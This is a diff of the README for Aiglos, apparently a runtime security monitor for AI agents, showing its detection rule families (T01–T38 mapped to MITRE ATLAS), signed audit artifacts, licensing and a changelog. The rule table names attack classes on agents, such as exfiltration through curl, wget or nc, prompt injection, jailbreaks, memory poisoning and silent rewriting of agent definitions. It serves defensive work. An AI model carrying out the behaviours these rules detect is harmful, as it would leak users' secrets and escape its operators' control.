-|`T04`|**CONFIG**          |Misconfiguration: exposed instances, missing auth, unsafe bindings|AML.T0010    |
-|`T05`|**SSRF**            |Server-side request forgery including IMDS/169.254.169.254        |AML.T0009    |
-|`T06`|**GOAL_DRIFT**      |Goal integrity violations across multi-turn sessions              |AML.T0031    |
-|`T07`|**SHELL_INJECT**    |Shell command injection via agent tool calls                      |AML.T0043    |
-|`T08`|**PRIV_ESC**        |Privilege escalation and capability expansion                     |AML.T0031    |
-|`T09`|**TOKEN_LEAK**      |Bearer token and OAuth credential exposure                        |AML.T0009    |
-|`T10`|**ENV_READ**        |Sensitive environment variable access                             |AML.T0009    |
-|`T11`|**SECRET_SCAN**     |API key, secret, and high-entropy string detection                |AML.T0009    |
-|`T12`|**FILE_WRITE**      |Sensitive file write paths (cron, sudoers, authorized_keys)       |AML.T0010    |
-|`T13`|**NETWORK**         |Dangerous network destinations and internal range access          |AML.T0009    |
-|`T14`|**DNS**             |DNS rebinding and resolver manipulation                           |AML.T0009    |
-|`T15`|**REFLECTION**      |Code reflection and dynamic execution                             |AML.T0043    |
-|`T16`|**DESERIALIZATION** |Unsafe deserialization patterns                                   |AML.T0043    |
-|`T17`|**TEMPLATE**        |Server-side template injection                                    |AML.T0043    |
-|`T18`|**XPATH**           |XPath injection                                                   |AML.T0043    |
-|`T19`|**CRED_ACCESS**     |SSH key, certificate, and credential file access                  |AML.T0009    |
-|`T20`|**DB_ADMIN**        |Dangerous database admin operations                               |AML.T0043    |
-|`T21`|**PACKAGE**         |Malicious package installation                                    |AML.T0010    |
-|`T22`|**REGISTRY**        |Windows registry manipulation                                     |AML.T0010    |
-|`T23`|**PROCESS**         |Process injection and hollowing                                   |AML.T0031    |
-|`T24`|**PERSISTENCE**     |Startup, service, and scheduled task persistence                  |AML.T0010    |
-|`T25`|**OAUTH**           |OAuth confused deputy and token misuse                            |AML.T0040    |
-|`T26`|**SUPPLY_CHAIN**    |Dependency confusion and typosquatting                            |AML.T0010.001|
-|`T27`|**PROMPT_INJECT**   |Indirect prompt injection in tool outputs                         |AML.T0051.000|
-|`T28`|**CONTEXT_POISON**  |Context window manipulation and hijacking                         |AML.T0051    |
-|`T29`|**A2A**             |Agent-to-agent protocol attacks                                   |AML.T0031    |
-|`T30`|**REGISTRY_MONITOR**|Live scanning: npm, PyPI, Smithery, ClawHub, SkillsMP             |AML.T0010.001|
-|`T31`|**MEMORY_POISON**   |RAG and persistent memory write-time scanning                     |AML.T0010    |
-|`T32`|**CREDENTIAL**      |Credential patterns across 20+ secret families                    |AML.T0009    |
-|`T33`|**JAILBREAK**       |Jailbreak and system prompt extraction attempts                   |AML.T0051.001|
-|`T34`|**DATA_AGENT**      |Exfiltration via analytics and BI tool calls                      |AML.T0009    |
-|`T35`|**PERSONAL_AGENT**  |Calendar, email, contact, and identity access                     |AML.T0009    |
-|`T36`|**ORCHESTRATION**   |Multi-agent orchestration and workflow hijacking                  |AML.T0031    |
+|ID            |Family              |Description                                                               |MITRE ATLAS  |
+|--------------|--------------------|--------------------------------------------------------------------------|-------------|
+|`T01`         |**EXFIL**           |Credential and data exfiltration via network calls                        |AML.T0009    |
+|`T02`         |**INJECT**          |SQL, command, and code injection via tool parameters                      |AML.T0043    |
+|`T03`         |**TRAVERSAL**       |Path traversal and directory escape                                       |AML.T0043    |
+|`T04`         |**CONFIG**          |Misconfiguration: exposed instances, missing auth, unsafe bindings        |AML.T0010    |
+|`T05`         |**SSRF**            |Server-side request forgery including IMDS/169.254.169.254                |AML.T0009    |
+|`T06`         |**GOAL_DRIFT**      |Goal integrity violations across multi-turn sessions                      |AML.T0031    |
+|`T07`         |**SHELL_INJECT**    |Shell command injection via agent tool calls                              |AML.T0043    |
+|`T08`         |**PRIV_ESC**        |Privilege escalation and capability expansion                             |AML.T0031    |
+|`T09`         |**TOKEN_LEAK**      |Bearer token and OAuth credential exposure                                |AML.T0009    |
+|`T10`         |**ENV_READ**        |Sensitive environment variable access                                     |AML.T0009    |
+|`T11`         |**PERSISTENCE**     |Crontab, launchd, systemd, and startup persistence mechanisms             |AML.T0010    |
+|`T12`         |**LATERAL_MOVEMENT**|SSH spawning to non-declared hosts, network scans                         |AML.T0009    |
+|`T13`         |**NETWORK**         |Dangerous network destinations and internal range access                  |AML.T0009    |
+|`T14`         |**DNS**             |DNS rebinding and resolver manipulation                                   |AML.T0009    |
+|`T15`         |**REFLECTION**      |Code reflection and dynamic execution                                     |AML.T0043    |
+|`T16`         |**DESERIALIZATION** |Unsafe deserialization patterns                                           |AML.T0043    |
+|`T17`         |**TEMPLATE**        |Server-side template injection                                            |AML.T0043    |
+|`T18`         |**XPATH**           |XPath injection                                                           |AML.T0043    |
+|`T19`         |**CRED_ACCESS**     |SSH key, certificate, and credential file access                          |AML.T0009    |
+|`T20`         |**DATA_EXFIL**      |PII and sensitive data exfiltration via HTTP/API                          |AML.T0009    |
+|`T21`         |**ENV_LEAK**        |Environment variable dump piped or redirected externally                  |AML.T0009    |
+|`T22`         |**RECON**           |OSINT and enumeration endpoint calls                                      |AML.T0009    |
+|`T23`         |**EXFIL_SUBPROCESS**|Data exfiltration via curl/wget/nc in subprocess calls                    |AML.T0009    |
+|`T24`         |**DATA_AGENT**      |Exfiltration via analytics and BI tool calls                              |AML.T0009    |
+|`T25`         |**CONFUSED_DEP**    |SSRF and cross-origin credential forwarding                               |AML.T0040    |
+|`T26`         |**SUPPLY_CHAIN**    |Dependency confusion, typosquatting, malicious package publish            |AML.T0010.001|
+|`T27`         |**PROMPT_INJECT**   |Indirect prompt injection in tool outputs and writable system prompts     |AML.T0051.000|
+|`T28`         |**CONTEXT_POISON**  |Context window manipulation and hijacking                                 |AML.T0051    |
+|`T29`         |**A2A**             |Agent-to-agent protocol attacks and cross-agent privilege escalation      |AML.T0031    |
+|`T30`         |**REGISTRY_MONITOR**|Live scanning: npm, PyPI, Smithery, ClawHub, SkillsMP                     |AML.T0010.001|
+|`T31`         |**MEMORY_POISON**   |RAG and persistent memory write-time scanning                             |AML.T0010    |
+|`T32`         |**CREDENTIAL**      |Credential patterns across 20+ secret families                            |AML.T0009    |
+|`T33`         |**JAILBREAK**       |Jailbreak and system prompt extraction attempts                           |AML.T0051.001|
+|`T34`         |**MODEL_EXFIL**     |Model weight and training data transfer patterns                          |AML.T0009    |
+|`T35`         |**PERSONAL_AGENT**  |Calendar, email, contact, and identity access                             |AML.T0009    |
+|`T36_AGENTDEF`|**AGENT_DEF_WRITE** |Writes to agent definition directories (silent reprogramming)             |AML.T0051    |
+|`T37`         |**FIN_EXEC**        |Autonomous financial transaction execution (Stripe, Infura, Coinbase, ACH)|AML.T0009    |
+|`T38`         |**AGENT_SPAWN**     |Sub-agent process spawning without session policy propagation             |AML.T0031    |
 
 </details>
 
@@ -393,15 +531,25 @@ Scan any ClawHub or SkillsMP skill against 8 risk signals before installing. T26
 
 ## Attestation artifacts
 
-Every session produces a cryptographically signed audit record. RSA-2048 signed. Timestamped. Chain of custody unbroken from tool call to submission.
+Every session produces a cryptographically signed audit record. HMAC-SHA256 signed (session identity chain), RSA-2048 signed at artifact level. Timestamped. Chain of custody unbroken from tool call to submission.
+
+v0.3.0 artifacts include:
+
+|Field                     |Content                                                    |
+|--------------------------|-----------------------------------------------------------|
+|`http_events`             |All HTTP/API calls with verdicts                           |
+|`subproc_events`          |All subprocess calls with tier and verdict                 |
+|`agentdef_violations`     |Agent definition file integrity violations (T36_AGENTDEF)  |
+|`agentdef_violation_count`|Count of violations at session close                       |
+|`multi_agent`             |Full parent-to-child spawn tree                            |
+|`session_identity`        |Session key header with public_token for chain verification|
+|`aiglos_version`          |Platform version at time of attestation                    |
 
 |Standard         |Controls                        |Use                               |
 |-----------------|--------------------------------|----------------------------------|
 |**SOC 2 Type II**|`CC6` `CC7`                     |Auditor-ready evidence package    |
 |**CMMC Level 2** |`AC.2.006` `SI.1.210` `AU.2.042`|C3PAO-formatted evidence          |
 |**NDAA §1513**   |`AI Risk Management`            |June 16, 2026 Congressional report|
-
-The artifact format is designed for auditor submission. The question auditors, security teams, and regulators are now asking: for any given session, what did your agents execute, in what order, against what systems, and who authorized it? The Aiglos session artifact answers that question. It is produced automatically at session close, signed, and formatted for the auditors already in your procurement chain.
 
 Attestation is available on Pro and Teams. [See pricing →](https://aiglos.dev/pricing)
 
@@ -411,11 +559,13 @@ Attestation is available on Pro and Teams. [See pricing →](https://aiglos.dev/
 
 |Component                            |License    |
 |-------------------------------------|-----------|
-|T1–T36 detection engine              |MIT        |
+|T1–T38 detection engine              |MIT        |
 |Python SDK                           |MIT        |
 |TypeScript SDK (Q2 2026)             |MIT        |
 |CVE database + POC code              |MIT        |
 |FastPathScanner (<1ms)               |MIT        |
+|Multi-agent session management       |MIT        |
+|AgentDefGuard, SessionIdentityChain  |MIT        |
 |Signed attestation artifacts         |Proprietary|
 |Cloud threat dashboard               |Proprietary|
 |CMMC / §1513 signed session artifacts|Proprietary|
@@ -423,6 +573,37 @@ Attestation is available on Pro and Teams. [See pricing →](https://aiglos.dev/
 |Air-gap DoD container                |Proprietary|
 
 The detection engine is open. Audit it. Fork it. Contribute to it. The attestation layer funds the research.
+
+-----
+
+## Changelog
+
+**v0.3.0 — March 2026**
+
+- T36_AGENTDEF: agent definition file poisoning detection (subprocess layer, runs before Tier 1 auto-allow)
+- T37 FIN_EXEC: autonomous financial transaction execution blocked (HTTP layer; Stripe, PayPal, Infura, Alchemy, Coinbase, Plaid Transfer, Dwolla; allow-list aware)
+- T38 AGENT_SPAWN: sub-agent process spawn detection and classification
+- `multi_agent.py`: AgentDefGuard (snapshot + diff), SessionIdentityChain (HMAC-SHA256 event signing), MultiAgentRegistry (spawn tree)
+- `attach()` new params: `enable_multi_agent`, `guard_agent_defs`, `session_id`
+- `close()` adds `agentdef_violations`, `multi_agent`, `session_identity`, `aiglos_version` to artifact
+- `status()` exposes `agent_def_guard_active`, `multi_agent_active`, `session_identity_active`
+- 251 tests passing
+
+**v0.2.0 — February 2026**
+
+- HTTP/API interception layer (requests, httpx, aiohttp, urllib)
+- Subprocess / CLI interception layer with three-tier blast radius
+- T20 DATA_EXFIL, T22 RECON, T25 SSRF, T34 DATA_AGENT, T35 MODEL_EXFIL, T36 SUPPLY_CHAIN (HTTP)
+- T07 SHELL_INJECT, T08 PATH_TRAVERSAL, T10 PRIV_ESC, T11 PERSISTENCE, T12 LATERAL_MOVEMENT, T19 CRED_HARVEST, T21 ENV_LEAK, T23 EXFIL_SUBPROCESS (subprocess)
+- Tier 3 pause mode with PagerDuty/Slack webhook approval
+- Unified session artifact covers MCP + HTTP + subprocess in single signed document
+
+**v0.1.0 — January 2026**
+
+- MCP interception layer
+- OpenClaw integration
+- Hermes trajectory signing
+- 335 tests passing
 
 -----
 
@@ -435,7 +616,7 @@ pip install -e ".[dev]"
 pytest tests/
 ```
 
-To contribute a rule family: <CONTRIBUTING.md>  
+To contribute a rule family: <CONTRIBUTING.md>
 To report a CVE: <SECURITY.md>
 
 Every new CVE filed against an AI agent gets a rule family — regardless of whether the attack came through MCP, a direct API call, or a malicious subprocess. If you find something not covered, open an issue.
@@ -446,7 +627,7 @@ Every new CVE filed against an AI agent gets a rule family — regardless of whe
 
 MIT. See <LICENSE>.
 
-The attestation layer (RSA-2048 signed JSON artifacts, verifiable offline) and cloud dashboard are proprietary. See [aiglos.dev/pricing](https://aiglos.dev/pricing).
+The attestation layer (HMAC-signed JSON session artifacts, RSA-2048 signed at artifact level, verifiable offline) and cloud dashboard are proprietary. See [aiglos.dev/pricing](https://aiglos.dev/pricing).
 
 -----
 
